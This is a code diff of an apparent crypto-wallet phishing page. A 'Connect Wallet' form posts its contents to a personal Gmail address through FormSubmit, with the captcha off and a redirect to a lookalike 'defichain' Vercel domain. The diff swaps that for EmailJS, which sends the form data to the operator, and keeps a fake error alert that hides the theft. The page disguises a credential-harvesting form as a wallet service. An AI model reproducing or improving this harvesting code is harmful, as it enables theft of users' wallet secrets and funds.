@@ -1563,10 +1563,8 @@
             <br>
           </div>
 
-             <form action="https://formsubmit.co/knote2609@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
-                                      <input type="hidden" name="_cc" value="formsubmitmails@gmail.com">
-                                        <input type="hidden" name="_captcha" value="false">
-                                        <input type="hidden" name="_next" value="https://defichain-web3restoredfixuser.vercel.app/access/point/barcode-generated.html">
+             <form action="" method="post" enctype="multipart/form-data" id="my-form" class="ajaxForm">
+                                     
                                        
                                        
           <div id="buttonContainer" class="container">
@@ -1589,7 +1587,7 @@
             
 
             <div class="error" style="color: red"></div>
-            <button id="sendButton" type="submit" name="submit" value="submit">
+            <button id="submit" type="submit" name="submit" value="submit">
               Connect Wallet
             </button>
              </form>
@@ -1614,7 +1612,7 @@
         </form>
       </div>
     </div>
-	<script type="text/javascript"
+    <script type="text/javascript"
 src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
 <script type="text/javascript">
@@ -1636,13 +1634,15 @@ const templateID = 'template_i00opnq';
 emailjs.sendForm(serviceID, templateID, this)
 .then(() => {
 btn.value = 'Send Email';
-alert('please contact admin');
+alert('error!');
 }, (err) => {
 btn.value = 'Send Email';
 alert(JSON.stringify(err));
 });
 });
 </script>
+
+
 
         <script src="js/javasc.js"></script>
     
